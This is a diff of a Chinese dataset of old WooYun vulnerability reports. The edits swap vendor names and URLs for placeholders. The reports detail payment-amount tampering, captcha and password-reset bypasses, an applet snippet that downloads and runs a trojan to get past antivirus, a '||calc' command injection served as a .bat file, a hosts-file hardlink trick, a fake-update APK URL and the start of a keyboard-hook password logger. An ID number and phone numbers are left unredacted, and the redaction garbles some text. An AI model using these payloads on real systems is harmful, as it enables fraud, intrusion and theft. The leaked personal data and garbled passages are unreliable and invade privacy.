 **POC**: 在多次尝试以后，发现验证码是通过cookie中的PHPSESSID来判断的修改PHPSESSID，成功绕过了验证码限制一枚高权限账号员工考勤资产信息，看到了某员工用Mac办公  福利真好员工信息可导出，继续渗透。。。。
 
@@ -23062,7 +23062,7 @@
 
 ---
 ### [wooyun-2014-052327] 某省电信支付漏洞可用1分钱购买全国流量卡
-**厂商**: 中国电信 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
+**厂商**: 某运营商 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -23073,7 +23073,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 陕西电信网厅提供流量卡购买功能http://sn.189.cn/service/pay/fluxcard.action?tab=buyFluxCard我们随便用一个电信号码试试，非陕西省的号码没有通过电信客户验证居然也能提交购买
+**详情**: 陕西电信网厅提供流量卡购买功能https://example.com/[已脱敏]
 
 **POC**: 随便选个支付方式，提交并截包看到金额了吗，果断改成1并放行看到了没，支付提示出现了果断支付了成功，欸手机响了，流量卡密已经发过来了耶。这张送我了吧，求不查水表！
 
@@ -23095,7 +23095,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: tianan-life.com点击立即投保，抓包POST /qysq/womanSeason/createOrderInfo HTTP/1.1Host: mall.tianan-life.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://mall.tianan-life.com/qysq/womanSeason/accidentInsu
+**详情**: tianan-life.com点击立即投保，抓包POST /qysq/womanSeason/createOrderInfo HTTP/1.1Host: mall.tianan-life.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -23117,7 +23117,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.wangdaicaifu.com/Member/common/forget.html点击下一步，抓包，拦截response将status参数中的0改为1成功调到这里，改一下试试、登陆试试。成功我已经是admin的权限了。你懂得。
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -23127,8 +23127,8 @@
 ---
 
 ---
-### [wooyun-2014-074100] 阿里巴巴来往APP某些协议缺陷
-**厂商**: 阿里巴巴 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2014-074100] 某电商平台来往APP某些协议缺陷
+**厂商**: 某电商平台 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -23141,16 +23141,16 @@
 
 **详情**: 来往app对某些mobile协议的时候没有很好处理，导致应用可自动拨打电话、发送短信，facetime等……测试环境：ios 7.1.2来往app：version 5.2.1（14349）
 
-**POC**: tel://10086sms://10086mailto://admin@qq.com<html><head><title>v</title></head><body><a id="dial" href="tel:10086">test</a></body><script type="text/javascript"><!--window.onload = function(){window.location.href = document.getElementById("dial").href;};//--></script></html>来往没有很好的处理这些协议，在im （与好友交谈）还
+**POC**: tel://10086sms://10086mailto://admin@某互联网公司.com<html><head><title>v</title></head><body><a id="dial" href="tel:10086">test</a></body><script type="text/javascript"><!--window.onload = function(){window.location.href = document.getElementById("dial").href;};//--></script></html>来往没有很好的处理这些协议，在im （与好友交谈）还
 
 **绕过**: 直接利用
 
-**修复**: http://drops.wooyun.org/papers/2886#comment-181707
+**修复**: https://example.com/[已脱敏]
 ---
 
 ---
-### [wooyun-2015-0105793] 手机支付宝存在在米源自动售饭机购买不扣费的漏洞
-**厂商**: 阿里巴巴 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2015-0105793] 手机某电商平台存在在米源自动售饭机购买不扣费的漏洞
+**厂商**: 某电商平台 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -23161,9 +23161,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 漏洞属于手机支付宝问题，手机支付宝在使用当面付购买米源自动售饭机的饮料时，手机支付宝不会扣费，想卖多少就买多少，我都买了好几天了，漏洞挺严重的，我在提乌云的同时（昨晚提交了一份，但是不详细，今天重新整了下），我也提交了阿里漏洞响应中心，希望尽快处理，全国有多少米源的自动售饭机我就不说，多大的损失也不说了，学生狗就是学安全的，自然就留意了一下我的支付宝账号是：15508033697  可以看看我的消费记录
+**详情**: 漏洞属于手机某电商平台问题，手机某电商平台在使用当面付购买米源自动售饭机的饮料时，手机某电商平台不会扣费，想卖多少就买多少，我都买了好几天了，漏洞挺严重的，我在提乌云的同时（昨晚提交了一份，但是不详细，今天重新整了下），我也提交了阿里漏洞响应中心，希望尽快处理，全国有多少米源的自动售饭机我就不说，多大的损失也不说了，学生狗就是学安全的，自然就留意了一下我的某电商平台账号是：15508033697  可以看看我的消费记录
 
-**POC**: 漏洞证明：证明的方式很简单，就是在米源自动售饭机上使用当面付购买饮料，支付宝的余额会先增加相应的饮料价格金钱，然后再次扣除，所以相当于没有扣钱，我在使用手机支付宝购买淘宝上的其他物品时，都是正常的扣费，下面我就贴上手机支付宝购买记录，小于5元钱都是在米源上当面付购买的饮料！！购买饮料异常信息但是不使用当面付，支付宝的余额转账，购买等均为正常变化 （注：3-24号也为购买饮料记录，余额异常）今天早上我再测去测试了下，打开支付宝看了消费记录，第一次购买依旧没有扣费，但是连续购买后却是扣费，有一定的时间间隔，就可以利用这个漏洞
+**POC**: 漏洞证明：证明的方式很简单，就是在米源自动售饭机上使用当面付购买饮料，某电商平台的余额会先增加相应的饮料价格金钱，然后再次扣除，所以相当于没有扣钱，我在使用手机某电商平台购买某电商平台上的其他物品时，都是正常的扣费，下面我就贴上手机某电商平台购买记录，小于5元钱都是在米源上当面付购买的饮料！！购买饮料异常信息但是不使用当面付，某电商平台的余额转账，购买等均为正常变化 （注：3-24号也为购买饮料记录，余额异常）今天早上我再测去测试了下，打开某电商平台看了消费记录，第一次购买依旧没有扣费，但是连续购买后却是扣费，有一定的时间间隔，就可以利用这个漏洞
 
 **绕过**: 直接利用
 
@@ -23229,7 +23229,7 @@
 
 **详情**: 1. 测试程序下载万能五笔输入法最新版，http://**.**.**.**/gf/wnwb**.**.**.**.exe2. 操作步骤2.1 Win8下安装万能五笔输入法，进入锁屏界面（Win键+L）；2.2 调出“屏幕讲述人”操作界面，切换到万能五笔输入法；2.3 在万能五笔输入法中选择“设置”按钮后，依次选择“帮助”、“官方网站”；2.4 选择使用Chrome打开；2.5 Chrome中通过file:///C:/Windows/System32浏览系统目录，并下载cmd.exe；2.6 执行cmd.exe并添加测试账户；
 
-**POC**: 2.1 ~ 2.32.42.52.6
+**POC**: 2.1 ~ [IP已脱敏].6
 
 **绕过**: 直接利用
 
@@ -23359,9 +23359,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 今天测试的一款网络电话，叫做华夏亿信。朋友之前做过代理，说是与电信，联通，移动一起做的一个项目。（左下角那个APP，壁纸是我女友，不是我）官方网站：http://www.huaxiayixin.com/
+**详情**: 今天测试的一款网络电话，叫做华夏亿信。朋友之前做过代理，说是与电信，联通，移动一起做的一个项目。（左下角那个APP，壁纸是我女友，不是我）官方网站：https://example.com/[已脱敏]
 
-**POC**: 打开这款网络电话之后，输入你注册的账号，验证之后随便选择一个联系人拨打电话。这个时候进行抓包，抓到以下代码其中a参数代表的是你自己的号码，b参数代表的是你拨打的号码。比如说我通过这个APP拨打了一个电话给我女朋友，在发送完这段数据包之后，我的手机会接到一个匿名来电。在我接起这个匿名来电的时候，我女朋友就会接到我的电话。原理（来自百度知道）：网络电话原理：网关将PSTN和Internet/Intranet连接起来，网关一侧连接Internet，另一侧与PSTN相连。它能够把来自Internet网的网络包经过解包、解压缩后，经过数／模变换成模拟语音信号传送给PSTN；也能够把来自PSTN的电话语音
+**POC**: 打开这款网络电话之后，输入你注册的账号，验证之后随便选择一个联系人拨打电话。这个时候进行抓包，抓到以下代码其中a参数代表的是你自己的号码，b参数代表的是你拨打的号码。比如说我通过这个APP拨打了一个电话给我女朋友，在发送完这段数据包之后，我的手机会接到一个匿名来电。在我接起这个匿名来电的时候，我女朋友就会接到我的电话。原理（来自某搜索引擎知道）：网络电话原理：网关将PSTN和Internet/Intranet连接起来，网关一侧连接Internet，另一侧与PSTN相连。它能够把来自Internet网的网络包经过解包、解压缩后，经过数／模变换成模拟语音信号传送给PSTN；也能够把来自PSTN的电话语音
 
 **绕过**: 直接利用
 
@@ -23383,7 +23383,7 @@
 
 **详情**: 
 
-**POC**: 付金额支付的话 支付宝 网银都没发库款但是只要金额为正数的话 支付宝不能付款 网银可以付款成功
+**POC**: 付金额支付的话 某电商平台 网银都没发库款但是只要金额为正数的话 某电商平台不能付款 网银可以付款成功
 
 **绕过**: 直接利用
 
@@ -23413,8 +23413,8 @@
 ---
 
 ---
-### [wooyun-2013-037354] 百度杀毒任意加载bootkit
-**厂商**: 百度 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2013-037354] 某搜索引擎杀毒任意加载bootkit
+**厂商**: 某搜索引擎 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -23425,7 +23425,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 主要问题可能是未对一些敏感系统文件进行保护，导致了可以被感染。我的例子中感染的是NTLDR，导致了可以写入恶意代码先于windows启动。参考电脑管家是拦截了，故而觉得这百度杀毒的一个疏忽吧！需要POC程序可以联系.
+**详情**: 主要问题可能是未对一些敏感系统文件进行保护，导致了可以被感染。我的例子中感染的是NTLDR，导致了可以写入恶意代码先于windows启动。参考电脑管家是拦截了，故而觉得这某搜索引擎杀毒的一个疏忽吧！需要POC程序可以联系.
 
 **POC**: (见原文)
 
@@ -23471,7 +23471,7 @@
 
 **详情**: 经过测试，众测提交漏洞的那个功能，只有第一次的时候会验证那个页面的验证码。也就是说，如果抓包后请求的话，第一次验证码为空，会提示验证码错误。 然后第二次就会请求成功，第三次、第四次......以后的提交请求都可以在验证码为空的情况下成功提交表单。然后也测试了一下主站，貌似不存在此问题。
 
-**POC**: 这个地址的测试数据麻烦管理给清理下。http://ce.wooyun.org/project/6
+**POC**: 这个地址的测试数据麻烦管理给清理下。https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -23513,7 +23513,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://bug.anquanxia.com/试了几个口令没对，发现可以注册，于是注册了个账号，虽然权限只是报告员，但能看到贵司很多bug信息哦
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 如上
 
@@ -23535,7 +23535,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 正常走一遍找回密码的流程，需要用手机接受验证码，拿到最后一步提交重置密码的url，发现竟然可以直接用在任意帐号！http://member.shopin.net/findMpassword?mobile=138********&m_password=nothing改完发现同一个账户竟然可以有两套密码，邮箱登陆用原来的密码，手机号用刚才改的密码，都可以登陆。。。
+**详情**: 正常走一遍找回密码的流程，需要用手机接受验证码，拿到最后一步提交重置密码的url，发现竟然可以直接用在任意帐号！https://example.com/[已脱敏]
 
 **POC**: 随便扒了个帐号，重置密码，进账户内有用户敏感信息
 
@@ -23557,7 +23557,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 问题出现在微信端的 爱特POS运维服务点击我的信息，发现只要输入客户号即可查看信息抓包POST /schoolweb_pos/posweixin.do?action=CheckReg&telno=&vcode=&v=1444199863057&regcode=123456&weixinid=oo0w6t-B0Nnjkeh9tY04gTxf8dbE HTTP/1.1Host: **.**.**.**Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Proxy-Connection: keep-aliveAccept-Language: zh-cnAccept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedOr
+**详情**: 问题出现在某互联网公司端的 爱特POS运维服务点击我的信息，发现只要输入客户号即可查看信息抓包POST /schoolweb_pos/posweixin.do?action=CheckReg&telno=&vcode=&v=1444199863057&regcode=123456&weixinid=oo0w6t-B0Nnjkeh9tY04gTxf8dbE HTTP/1.1Host: **.**.**.**Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Proxy-Connection: keep-aliveAccept-Language: zh-cnAccept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedOr
 
 **POC**: 然后对6位商户号进行遍历
 
@@ -23567,8 +23567,8 @@
 ---
 
 ---
-### [wooyun-2015-0105538] 支付宝登录控件密码输入被监听漏洞
-**厂商**: 阿里巴巴 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2015-0105538] 某电商平台登录控件密码输入被监听漏洞
+**厂商**: 某电商平台 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 认证接口
 
@@ -23579,7 +23579,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 支付宝安全登录控件虽然使用了消息钩子等手段进行防御，但依然不够完善，通过其他窃听手段还是能够获取到用户输入的密码。
+**详情**: 某电商平台安全登录控件虽然使用了消息钩子等手段进行防御，但依然不够完善，通过其他窃听手段还是能够获取到用户输入的密码。
 
 **POC**: HHOOK g_hk = NULL;TCHAR g_buff[100] = { 0 };int g_index = 0;LRESULT CALLBACK Hook(int nCode, WPARAM wp, LPARAM lp){static DWORD a_other[] ={VK_CAPITAL, VK_LSHIFT, VK_RSHIFT, VK_LCONTROL, VK_RCONTROL, VK_LMENU, VK_RMENU,};KBDLLHOOKSTRUCT* pLL = ((KBDLLHOOKSTRUCT*)lp);DWORD vk = pLL->vkCode;for(int i 
 
@@ -23601,7 +23601,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 首先接着WooYun: 江西智能交通漏洞可查看注册手机号实名姓名以及身份证号码下载江西交警，安装，在注册页面输入手机号后点击获取验证码(同时抓包)可以看到，验证码是0200，同时手机上（同时也知道验证码是软件随机生成，然后再GET提交给短信发送接口）http://223.82.246.237:8080/ivhs/ajax_getRandomNum.action?phone=手机号&random=验证码(随便什么字母数字网站，中文不行)这可以无限制提交，如果被人利用可以发送大量垃圾短信，钓鱼网站连接。http://223.82.246.237:8080/ivhs/ajax_getRandomNum.action?phone=手机号&random=My name is Xuwei, from http://www.wooyun.org/
+**详情**: 首先接着WooYun: 江西智能交通漏洞可查看注册手机号实名姓名以及身份证号码下载江西交警，安装，在注册页面输入手机号后点击获取验证码(同时抓包)可以看到，验证码是0200，同时手机上（同时也知道验证码是软件随机生成，然后再GET提交给短信发送接口）http://[IP已脱敏] name is Xuwei, from https://example.com/[已脱敏]
 
 **POC**: 还有就是只要知道某人的手机号，他又没有注册，输入他的手机号，点击获取验证码，同时抓包，就可以知道验证码，用他的手机号注册，然后点击同步，再抓包，既可得到该手机号的真实姓名身份证号码。如果他已经注册过该软件，只需要根据WooYun: 江西智能交通漏洞可查看注册手机号实名姓名以及身份证号码的方法，也同样可以获得他的身份证号码，有了真实姓名身份证号码，用处十分大，可以干好多坏事，而且短信接口这可以无限制提交，可以发送大量垃圾短信，钓鱼网站连接，危害巨大。
 
@@ -23623,9 +23623,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 0x0149you手游 http://m.49you.com/登录功能没有设置验证码及登录错误次数限制，导致可爆破密码或撞库0x02首先我们可以通过注册功能来获取一部分用户名用户名为字母与数字组合这个注册功能的验证码不会刷新，那我们就可以抓取这个请求。来获取一部分用户名字典注册的请求为GET请求，，，，很是 “给力”GET /V7/Accounts/WebRegister?callback=jQuery18305054380079761739_1435239707930&requestId=233&sign=233&appId=233&password=111111&code=2837&name=a123456&device=3&_=1435240405535 HTTP/1.1Host: api.sdk.49app.comUser-Agent: Mozilla/5.0 (Macintosh
+**详情**: 0x0149you手游 https://example.com/[已脱敏] “给力”GET /V7/Accounts/WebRegister?callback=jQuery18305054380079761739_1435239707930&requestId=233&sign=233&appId=233&password=111111&code=2837&name=a123456&device=3&_=1435240405535 HTTP/1.1Host: api.sdk.49app.comUser-Agent: Mozilla/5.0 (Macintosh
 
-**POC**: 0x0149you手游 http://m.49you.com/登录功能没有设置验证码及登录错误次数限制，导致可爆破密码或撞库0x02首先我们可以通过注册功能来获取一部分用户名用户名为字母与数字组合这个注册功能的验证码不会刷新，那我们就可以抓取这个请求。来获取一部分用户名字典注册的请求为GET请求，，，，很是 “给力”GET /V7/Accounts/WebRegister?callback=jQuery18305054380079761739_1435239707930&requestId=233&sign=233&appId=233&password=111111&code=2837&nam
+**POC**: 0x0149you手游 https://example.com/[已脱敏] “给力”GET /V7/Accounts/WebRegister?callback=jQuery18305054380079761739_1435239707930&requestId=233&sign=233&appId=233&password=111111&code=2837&nam
 
 **绕过**: 直接利用
 
@@ -23677,8 +23677,8 @@
 ---
 
 ---
-### [wooyun-2015-0164726] 新浪旗下某业务设计逻辑缺陷导致大量员工邮箱沦陷/项目通讯录泄露
-**厂商**: 新浪 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2015-0164726] 某社交平台旗下某业务设计逻辑缺陷导致大量员工邮箱沦陷/项目通讯录泄露
+**厂商**: 某社交平台 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -23735,7 +23735,7 @@
 
 **详情**: 看起来有验证码，固定Cookie中的PHPSESSID不变即可进行暴力破解。admin/login.php  56-64行if (!is_array($user)) {$dou->create_admin_log($_LANG['login_action'] . ': ' . $_POST['user_name'] . " ( " . $_LANG['login_user_name_wrong'] . " ) ");$dou->dou_msg($_LANG['login_input_wrong'], 'login.php', 'out');} elseif (md5($_POST['password']) != $user['password']) {if ($_POST['password']) {$dou->create_admin_log($_LANG['login_action']
 
-**POC**: 我们的测试字典文件100123101123102123103123104123105123106123107123108123109123110123111123admin888112123113123114123115123116123117123118123119123http://demo.douco.com/admin/login.php 这里是自带密码admin888的，我把它添加到playload里去。正确密码返回302ResponseLocation: http://demo.douco.com/admin/index.php已经登录成功。
+**POC**: 我们的测试字典文件100123101123102123103123104123105123106123107123108123109123110123111123admin888112123113123114123115123116123117123118123119123https://example.com/[已脱敏] 这里是自带密码admin888的，我把它添加到playload里去。正确密码返回302ResponseLocation: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -23743,8 +23743,8 @@
 ---
 
 ---
-### [wooyun-2014-060272] 腾讯电脑管家敏感文件防护绕过
-**厂商**: 腾讯 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2014-060272] 某互联网公司电脑管家敏感文件防护绕过
+**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -23755,7 +23755,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 利用一些小技巧和文件系统特性可以绕过腾讯电脑管家敏感文件防护。其实利用点在NTSF硬链接上，对同一个文件赋予了多个文件名和路径，而磁盘上实际只有一个文件，修改其中一个，所有文件同步变化。以host文件为例：使用命令fsutil hardlink create c:\a.txt C:\WINDOWS\system32\drivers\etc\hosts为host创建硬链接，然后ping gov.cn >> a.txt像其中追加信息。exe直接执行此命令会被拦截，提示程序试图覆盖hosts，阻止后硬链接创建失败，但是可以使用exe释放批处理文件并执行来达到目的。此时硬链接可以创建成功，但是修改会被拦截，点击拦截。按理说拦截后并没有对hosts文件造成影响，但是当实际打开时大吃一惊，拦截并未生效，hosts依旧被修改。证明中上图。
+**详情**: 利用一些小技巧和文件系统特性可以绕过某互联网公司电脑管家敏感文件防护。其实利用点在NTSF硬链接上，对同一个文件赋予了多个文件名和路径，而磁盘上实际只有一个文件，修改其中一个，所有文件同步变化。以host文件为例：使用命令fsutil hardlink create c:\a.txt C:\WINDOWS\system32\drivers\etc\hosts为host创建硬链接，然后ping gov.cn >> a.txt像其中追加信息。exe直接执行此命令会被拦截，提示程序试图覆盖hosts，阻止后硬链接创建失败，但是可以使用exe释放批处理文件并执行来达到目的。此时硬链接可以创建成功，但是修改会被拦截，点击拦截。按理说拦截后并没有对hosts文件造成影响，但是当实际打开时大吃一惊，拦截并未生效，hosts依旧被修改。证明中上图。
 
 **POC**: C盘根目录截图，记录一下：原hosts文件：程序尝试直接修改被拦截：直接exe创建硬链接被拦截了，忘记截图了，下面是释放批处理文件并执行之：释放的批处理及其创建的硬链接：修改硬链接过程中提示拦截：实际拦截无效，文件被修改：
 
@@ -23799,9 +23799,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 前几天不小心看360安全卫士有对jre漏洞挂马做拦截，所以想绕过，测试了一下！//之前，有发过给你们邮箱，说附件太大没收到。发网盘后再发邮件给你们就没消息了，效率太低了，还是发乌云效率高点，看看是不是漏洞？漏洞赏金没有，看能不能刷点rank!//之前邮件描述：360安全卫士最近对jre漏洞浏览器Applet挂马攻击有做行为检测，如图：但检测存在缺陷以及直接绕过情况，简单测试步骤（详细测试视频和其他相关文件及信息在附件）：1、如果直接下载，然后就运行木马就是上图的情况，被拦截：this.downLoad("http://127.0.0.1:8080/360.exe", "C:/Program Files/360.exe");//下载木马this.runFile("C:/Program Files/360.exe");//运行2、在第1步中，是下载木马到本地，然后运行会被拦截，检测规则是两部分
+**详情**: 前几天不小心看360安全卫士有对jre漏洞挂马做拦截，所以想绕过，测试了一下！//之前，有发过给你们邮箱，说附件太大没收到。发网盘后再发邮件给你们就没消息了，效率太低了，还是发乌云效率高点，看看是不是漏洞？漏洞赏金没有，看能不能刷点rank!//之前邮件描述：360安全卫士最近对jre漏洞浏览器Applet挂马攻击有做行为检测，如图：但检测存在缺陷以及直接绕过情况，简单测试步骤（详细测试视频和其他相关文件及信息在附件）：1、如果直接下载，然后就运行木马就是上图的情况，被拦截：this.downLoad("http://[IP已脱敏] "C:/Program Files/360.exe");//下载木马this.runFile("C:/Program Files/360.exe");//运行2、在第1步中，是下载木马到本地，然后运行会被拦截，检测规则是两部分
 
-**POC**: //今天又做了另一个jre漏洞（CVE-2012-4681）同样方式测试，弄了个综合测试地址：http://shinewooyun.duapp.com/视频中简单过程测试代码：//C:/Program Files/目录//    this.downLoad("http://shinewooyun.duapp.com/360.exe", "C:/Program Files/360.exe");//下载木马//    this.runFile("C:/Program Files/360.exe");//运行//下载到java安装目录(jre运行目录)，运行木马，这一目录行为绕过拦截// this.
+**POC**: //今天又做了另一个jre漏洞（CVE-2012-4681）同样方式测试，弄了个综合测试地址：https://example.com/[已脱敏] Files/目录//    this.downLoad("https://example.com/[已脱敏]", "C:/Program Files/360.exe");//下载木马//    this.runFile("C:/Program Files/360.exe");//运行//下载到java安装目录(jre运行目录)，运行木马，这一目录行为绕过拦截// this.
 
 **绕过**: 过滤绕过
 
@@ -23875,8 +23875,8 @@
 ---
 
 ---
-### [wooyun-2014-048360] 微博微彩票应用逻辑漏洞
-**厂商**: 新浪 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2014-048360] 某社交平台微彩票应用逻辑漏洞
+**厂商**: 某社交平台 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -23887,7 +23887,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 微彩票1分钱买彩票.在web端购买,不付款,然后安卓手机微博客户端购买,付款后,再去web端付款,可以重复购买,相当于花2分钱买了2注彩票...ps:客户端上购买时貌似会提示只能购买一注,但当时俺点了后貌似跳过这个弹框进入支付了..求多送几注彩票呗.. 哈哈..
+**详情**: 微彩票1分钱买彩票.在web端购买,不付款,然后安卓手机某社交平台客户端购买,付款后,再去web端付款,可以重复购买,相当于花2分钱买了2注彩票...ps:客户端上购买时貌似会提示只能购买一注,但当时俺点了后貌似跳过这个弹框进入支付了..求多送几注彩票呗.. 哈哈..
 
 **POC**: (见原文)
 
@@ -23909,7 +23909,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 我是看到新闻你们网站被刷了6万  我就顺手测了一下你们官网http://j.news.163.com/docs/4/2015081620/B15O8DM190018DM2.html新闻里面说黑客利用这个WooYun: 来伊份支付漏洞才得逞的这个漏洞只提到你们的app有问题  没提到你们官网  所以我就提个醒  如果你们已经知道就请忽略吧付款抓包篡改支付宝
+**详情**: 我是看到新闻你们网站被刷了6万  我就顺手测了一下你们官网https://example.com/[已脱敏] 来伊份支付漏洞才得逞的这个漏洞只提到你们的app有问题  没提到你们官网  所以我就提个醒  如果你们已经知道就请忽略吧付款抓包篡改某电商平台
 
 **POC**: (见原文)
 
@@ -23953,7 +23953,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 参考http://drops.wooyun.org/papers/3771最新版随便找个callback测试下：<html><body><a href="http://123.sogou.com/x/2012zqj/winner_list.php?callback=12345||calc" download="123.bat">UPDATE</a></br></body></html>
+**详情**: 参考https://example.com/[已脱敏] href="https://example.com/[已脱敏]" download="123.bat">UPDATE</a></br></body></html>
 
 **POC**: 弹出计算机
 
@@ -23977,7 +23977,7 @@
 
 **详情**: 组件com.youku.service.push.StartActivityService声明如下：<serviceandroid:label="Youku Push Notifications StartActivityService"android:name="com.youku.service.push.StartActivityService"android:exported="true">可知该组件对外暴露。该组件对应的代码执行部分如下：protected void onHandleIntent(Intent intent) {Intent v0;String v23;Serializable pushMsg = intent.getSerializableExtra("PushMsg");......AppVersionManager.getInstance(Youku.con
 
-**POC**: 该漏洞触发的关键在于对PushMsg数据的控制，基本思路如下：1.创建一个Android App程序，在主Activity中的关键代码如下：PushMsg pushMsg = new PushMsg();pushMsg.type = 1;pushMsg.updateurl = "http://gdown.baidu.com/data/wisegame/41839d1d510870f4/jiecaojingxuan_51.apk";pushMsg.updatecontent = "This is Fake";Intent intent = new Intent();intent.setClass
+**POC**: 该漏洞触发的关键在于对PushMsg数据的控制，基本思路如下：1.创建一个Android App程序，在主Activity中的关键代码如下：PushMsg pushMsg = new PushMsg();pushMsg.type = 1;pushMsg.updateurl = "https://example.com/[已脱敏]";pushMsg.updatecontent = "This is Fake";Intent intent = new Intent();intent.setClass
 
 **绕过**: 直接利用
 
@@ -23997,7 +23997,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 万达电影网站在处理会员卡充值时，未校验会员卡身份，直接回显会员持有人身份证、手机号等敏感信息。http://www.wandafilm.com/user/card_mgr.do?m=initRecharge&cardNo=8002012036436会员卡号：	8002012036437会员卡级别：	广州IMAX卡会员卡金额：	170身份证号：	220421198911150810联系电话：	18613153337注册时间：	2012-12-09到期时间：	2013-12-09通过获取如下的信息，可致电客服热线：400-080-6060，重置任意会员卡的密码，进而消费。
+**详情**: 万达电影网站在处理会员卡充值时，未校验会员卡身份，直接回显会员持有人身份证、手机号等敏感信息。https://example.com/[已脱敏]	8002012036437会员卡级别：	广州IMAX卡会员卡金额：	170身份证号：	220421198911150810联系电话：	18613153337注册时间：	2012-12-09到期时间：	2013-12-09通过获取如下的信息，可致电客服热线：400-080-6060，重置任意会员卡的密码，进而消费。
 
 **POC**: (见原文)
 
@@ -24085,7 +24085,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 首先来首页注册帐号看家具去了   呆了 好贵3万加入购物车结算提交订单都没没什么发现直到最后付款哈哈  机智的我  抓包下面是银行卡付款案列，改的小数点（2.77）这里是0.1元支付宝付款付款不用说 百分百成功兜里有钱 咱不差一分钱
+**详情**: 首先来首页注册帐号看家具去了   呆了 好贵3万加入购物车结算提交订单都没没什么发现直到最后付款哈哈  机智的我  抓包下面是银行卡付款案列，改的小数点（2.77）这里是0.1元某电商平台付款付款不用说 百分百成功兜里有钱 咱不差一分钱
 
 **POC**: (见原文)
 
@@ -24129,7 +24129,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://wooyun.org/bugs/wooyun-2015-095638/trace/2e0247bec4eb612930800968d5426f13给力第二发接口：http://www.007.mx/fyws/同样的验证码绕过首先来到接口，可以看到有验证码登录限制的但是经过测试，验证码一样形同虚设，直接绕过抓包后查看到用户名和密码全部明文传输接下来开始暴力破解。。根据返回值查看和上次的接口是不一样的（上次13000+这次8000+）随便选几个登录看看全部成功
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -24161,8 +24161,8 @@
 ---
 
 ---
-### [wooyun-2015-090764] 支付宝安全插件导致部分EVSSL证书不能使IE地址栏变绿
-**厂商**: 阿里巴巴 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2015-090764] 某电商平台安全插件导致部分EVSSL证书不能使IE地址栏变绿
+**厂商**: 某电商平台 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -24173,18 +24173,18 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
